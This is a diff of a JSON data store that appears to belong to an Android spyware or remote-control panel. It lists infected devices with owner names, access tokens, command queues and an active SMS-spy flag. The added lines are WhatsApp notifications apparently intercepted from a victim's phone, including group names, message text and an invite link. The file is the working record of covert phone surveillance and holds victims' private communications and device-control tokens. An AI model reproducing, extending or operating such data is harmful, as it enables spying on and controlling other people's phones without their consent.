@@ -4,7 +4,7 @@
     "deviceName": "HP-ABLO-F55F",
     "ownerUsername": "Zarr",
     "token": "7055f57f74cb7eef5034e3301d747b14",
-    "lastSeen": 1777804770064,
+    "lastSeen": 1777804772963,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T05:33:28.300Z",
@@ -52,6 +52,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB² || ALL GAME || DITZ STORE 116 (3 pesan): ~ d¡tz4youz",
+        "content": "🔗 JB² || ALL GAME || DITZ STORE 116 | https://chat.whatsapp.com/EgiVXY4UcHU57l7wkHVnv3",
+        "time": "03/05 17:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777804775479
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB² || ALL GAME || DITZ STORE 116 (3 pesan): ~ d¡tz4youz",
+        "content": "GB DITUTUP MAU PUS MEMBER",
+        "time": "03/05 17:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777804775298
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "JB² || ALL GAME || DITZ STORE 116",
+        "content": "~ d¡tz4youz: GB DITUTUP MAU PUS MEMBER",
+        "time": "03/05 17:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777804775242
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4389,7 +4413,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777804768250,
+    "lastSeen": 1777804774258,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
